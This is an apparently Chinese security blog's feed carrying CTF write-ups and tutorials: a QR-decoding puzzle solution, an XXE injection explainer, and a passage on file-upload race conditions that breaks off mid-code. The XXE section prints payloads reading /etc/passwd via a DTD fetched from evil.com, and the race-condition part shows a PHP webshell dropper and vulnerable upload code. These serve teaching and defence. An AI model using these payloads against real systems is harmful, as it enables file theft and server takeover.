src="https://img-blog.csdnimg.cn/20210508193738188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用原图地址链接下载图片，能看到一个蓝奏云链接<br><img src="https://img-blog.csdnimg.cn/20210508193452110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://wwa.lanzous.com/iNVbsoqrz8f<br>MTVDQw==<br></code></pre></td></tr></table></figure><p>提取码是<code>MTVDQw==</code>，Base64解码得到<code>15CC</code>,下载附件<br><img src="https://img-blog.csdnimg.cn/20210508211008367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用<a href="http://z.duoluosb.com/">在线网站</a>进行社会主义核心价值观解密得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">壹贰叁肆伍陆柒8玖〇壹2叁肆56柒89〇壹23肆伍<br>陆78901贰3肆56柒89〇1贰叁4伍陆7捌玖0<br>壹2叁肆伍6柒89〇壹贰叁肆5陆柒捌9〇123肆5<br>陆7捌玖〇1贰345陆柒8玖〇壹贰34567890<br>壹2叁肆伍6柒8玖01贰叁4伍6柒捌玖〇壹234伍<br>陆78901贰3肆5陆78玖0壹贰345陆7捌玖0<br>壹贰叁肆伍陆柒890壹贰叁肆56柒8玖0壹234伍<br>67890123肆伍6柒捌玖〇1贰345陆7890<br>壹贰3肆56柒捌90123肆56柒捌玖〇壹贰3肆5<br>67捌9〇1234伍陆78玖〇壹贰3肆5陆7捌9〇<br>12叁肆伍6柒8901贰叁肆伍陆7捌9〇壹2叁肆伍<br>陆柒89〇123肆伍67890壹234567捌玖0<br>壹2叁4伍陆柒捌901贰3肆56柒捌9〇壹2345<br>陆78玖0壹23肆伍67捌90壹2叁4伍陆7捌9〇<br>壹2叁45陆柒89〇1贰叁45陆7890壹23肆伍<br>陆柒8901234伍陆柒8玖〇1贰34伍6柒捌玖0<br>壹贰34伍陆柒89〇壹2叁肆5陆柒89〇1贰叁肆伍<br>678901234伍67捌9〇1234567890<br>壹贰叁肆伍陆柒8玖0壹2叁4伍6柒8玖〇壹贰叁肆伍<br>陆78901贰3肆伍陆7捌901贰3肆56789〇<br>壹2叁肆伍6柒89012345陆柒8玖0壹贰叁4伍<br>陆7捌玖〇1贰3肆56789〇1贰3肆5陆柒捌9〇<br>壹2叁肆伍6柒8玖〇1贰345陆柒8玖0壹贰叁4伍<br>陆78901贰3肆5678玖01贰3肆56789〇<br>壹贰叁肆伍陆柒8玖01贰3肆伍陆78玖〇壹贰叁肆伍<br></code></pre></td></tr></table></figure><p>汉字转换成1，数字换成0 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111011101100100110011<br>1000001010010010110110110<br>1011101001111101110100010<br>1011101000110111100000000<br>1011101010011010111110001<br>1000001010100101100010110<br>1111111000111100101010001<br>0000000011011110100010000<br>1101001100000100111111010<br>0010100001100111101010101<br>0011101000011111010110111<br>1100100011000001000000110<br>1010111100010100110110000<br>1001010011001001010110101<br>1010011001011001000010011<br>1100000001110110100101110<br>1100111001101101100101111<br>0000000001001010000000000<br>1111111010101010101111111<br>1000001011101000101000001<br>1011101000000001101011101<br>1011101010000010101011101<br>1011101011010001101011101<br>1000001010000100101000001<br>1111111010010111001111111<br></code></pre></td></tr></table></figure><p>25x25,之前做过一样的，直接使用脚本转换成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL.Image<br>MAX = <span class="hljs-number">25</span><br>pic = PIL.Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#xx27;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>                        pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>                <span class="hljs-keyword">else</span>:<br>                        pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>                i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫描二维码得到flag</p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;



&lt;h2 id=&quot;练武&quot;&gt;&lt;a href=&quot;#练武&quot; class=&quot;headerlink&quot; title=&quot;练武&quot;&gt;&lt;/a&gt;练武&lt;/h2&gt;&lt;h3 id=&quot;李华的红包&quot;&gt;&lt;a href=&quot;#李华的红包&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="https://swhat.github.io/2021/05/25/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2021/05/25/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-05-25T08:26:42.000Z</published>
    <updated>2021-11-27T12:23:38.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE(XML External Entity Injection)即：XML外部实体注入</p><p><strong>直接搬运某文库的资料：</strong><br>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害<br><strong>注意：</strong>执行系统命令(安装expect扩展的PHP环境里才有)</p><h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型.<br>是一种允许用户对自己的标记语言进行定义的源语言。<br>XML文档结构包括XML声明、DTD文档类型定义、文档元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; ?&gt;</span><span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">user</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">user</span> (<span class="hljs-meta-keyword">name</span>,<span class="hljs-meta-keyword">sex</span>,<span class="hljs-meta-keyword">age</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">name</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">sex</span>  (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">age</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><span class="hljs-comment">&lt;!--DTD文档类型定义--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>SNCKER<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>woman<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br></code></pre></td></tr></table></figure><p>DTD(文档类型定义)的作用是定义XML文档的合法构建模块。<br>DTD 可以在 XML 文档内声明，也可以外部引用。<br>PCDATA 指的是被解析的字符数据（Parsed Character Data）<br>XML解析器通常会解析XML文档中所有的文本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>此文本会被解析<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当某个XML元素被解析时，其标签之间的文本也会被解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">first</span>&gt;</span>Bill<span class="hljs-tag">&lt;/<span class="hljs-name">first</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">last</span>&gt;</span>Gates<span class="hljs-tag">&lt;/<span class="hljs-name">last</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--内部声明DTD--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="hljs-comment">&lt;!--引用外部DTD--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;文件名”&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!--或者--&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!DOCTYPE 根元素 PUBLIC &quot;</span>public_ID<span class="hljs-meta-string">&quot; &quot;</span>文件名<span class="hljs-meta-string">&quot;&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!--DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。--&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!--内部声明实体--&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!ENTITY 实体名称 &quot;</span>实体的值<span class="hljs-meta-string">&quot;&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!--引用外部实体--&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!ENTITY 实体名称 SYSTEM &quot;</span>URI<span class="hljs-meta-string">&quot;&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!--或者--&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&lt;!ENTITY 实体名称 PUBLIC &quot;</span>public_ID<span class="hljs-meta-string">&quot; &quot;</span>URI<span class="hljs-meta-string">&quot;&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="恶意引入外部实体的三种方法"><a href="#恶意引入外部实体的三种方法" class="headerlink" title="恶意引入外部实体的三种方法"></a>恶意引入外部实体的三种方法</h2><h3 id="本地引入"><a href="#本地引入" class="headerlink" title="本地引入"></a>本地引入</h3><p>XML内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; ?&gt;</span> <span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE x[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><span class="hljs-comment">&lt;!--DTD文档类型定义--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;amp;</span>file;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br></code></pre></td></tr></table></figure><p>一个实体由三部分构成：一个与号 &amp;，一个实体名称,，以及一个分号;</p><h3 id="远程引入1"><a href="#远程引入1" class="headerlink" title="远程引入1"></a>远程引入1</h3><p>XML内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE x [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTRITY % d <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://evil.com/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%d;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;amp;</span>file;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD文件(evil.dtd)内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="远程引入2"><a href="#远程引入2" class="headerlink" title="远程引入2"></a>远程引入2</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE x <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://evil.com/evil.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;amp;</span>file;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD文件(evil.dtd)内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="防御XXE"><a href="#防御XXE" class="headerlink" title="防御XXE"></a>防御XXE</h1><p>主要思路就是禁用外部实体的引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">libxml_disable_entity_loader(true); <br>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); <br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities = <span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot; title=&quot;XXE&quot;&gt;&lt;/a&gt;XXE&lt;/h1&gt;&lt;p&gt;XXE(XML External Entity Injection)即：XML外部实体注入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直接搬运某</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="XXE" scheme="https://swhat.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>浅析条件竞争漏洞</title>
    <link href="https://swhat.github.io/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-05-23T14:05:15.000Z</published>
    <updated>2021-08-15T03:59:06.609Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="0x00-条件竞争"><a href="#0x00-条件竞争" class="headerlink" title="0x00-条件竞争"></a>0x00-条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01-基础知识"></a>0x01-基础知识</h2><p>先来了解一下关于条件竞争的基础知识</p><p><strong>条件竞争</strong>：<br>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程 或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。</p><p><strong>进程</strong>：<br>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p><p><strong>线程</strong>：<br>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在 运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。<br><strong>Session：</strong><br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02-漏洞分析"></a>0x02-漏洞分析</h2><p>攻击者不断的发起访问请求访问该文件，该文件一旦被执行，就会在服务器上生成一个恶意的shell文件</p><p>首先上传一个php文件，然后检测文件后缀名，如果不符合条件，就删掉，虽然php代码在执行的时候是线性执行代码的，但是执行的时候可以有多个线程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = substr(<span class="hljs-variable">$filename</span>,strrpos(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);   <span class="hljs-comment">#后缀</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmp</span>, <span class="hljs-variable">$path</span>))&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php/i&#x27;</span>, <span class="hljs-variable">$ext</span>))&#123;   <span class="hljs-comment">#判断后缀是否为php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;upload success,file in &#x27;</span>.<span class="hljs-variable">$path</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>unlink(<span class="hljs-variable">$path</span>);    <span class="hljs-comment">#已经上传后判断若是PHP则删除</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can&#x27;t upload php file!&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;upload error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续上传一个php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;</span>;<br>file_put_contents(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-variable">$content</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>在执行完move_uploaded_file之后，执行unlink之前，此时这个php文件是已经保存到了web服务器上的，并且我们能够访问。</p><p>如果上传的php的功能是写一句话到一个php文件，这样我们在删除之前访问该文件，就会生成一个一句话木马，就可以得到webshell。 所以我们使用多线程并发的不断访问上传的文件，务器中的函数执行都是需要时间的，如果我上传上去的文件在没被删除的时候，一旦成功访问到了上传的文件，那么它就会向服务器写入shell。</p><p>   一般而言，我们是上传了文件，但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，以及删除文件的函数进行竞争。文件被访问了依旧可以删除，它删除跟我访问没有任何关系。</p><h2 id="0x03-CTF中的条件竞争"><a href="#0x03-CTF中的条件竞争" class="headerlink" title="0x03-CTF中的条件竞争"></a>0x03-CTF中的条件竞争</h2><h3 id="upload-libs-pass17"><a href="#upload-libs-pass17" class="headerlink" title="upload-libs pass17"></a>upload-libs pass17</h3><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            unlink(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-comment">//存储在服务器的文件的临时副本的名称</span><br></code></pre></td></tr></table></figure><p>当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。然后执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 